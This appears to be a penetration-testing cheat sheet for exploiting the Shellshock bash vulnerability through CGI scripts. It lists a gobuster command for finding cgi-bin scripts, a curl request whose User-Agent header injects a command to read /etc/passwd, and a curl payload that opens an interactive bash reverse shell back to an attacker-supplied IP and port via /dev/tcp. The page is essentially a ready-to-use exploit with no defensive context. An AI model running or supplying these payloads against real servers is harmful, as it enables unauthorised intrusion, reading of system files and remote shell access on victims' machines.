# CGI applications - Shellshock

```shellscript
# Enumerate for cgi scripts
gobuster dir -u http://<IP>/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi

# Confirm the vuln
 curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://<IP>/cgi-bin/<CGI_SCRIPT>
 
 # Get a reverse shell 
 curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1' http://<IP>/cgi-bin/<CGI_SCRIPT>
```
